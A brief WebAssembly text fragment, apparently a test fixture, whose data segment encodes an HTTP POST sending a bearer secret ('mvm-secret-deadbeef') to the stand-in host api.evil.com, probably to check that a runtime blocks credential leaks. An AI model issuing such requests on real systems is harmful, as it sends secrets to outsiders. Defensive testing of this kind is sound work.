(module
  ...
  (data (i32.const 0) "{\"method\":\"POST\",\"url\":\"https://api.evil.com/v1/chat/completions\",\"headers\":[[\"Authorization\",\"Bearer mvm-secret-deadbeef\"]],\"body_b64\":\"\"}")
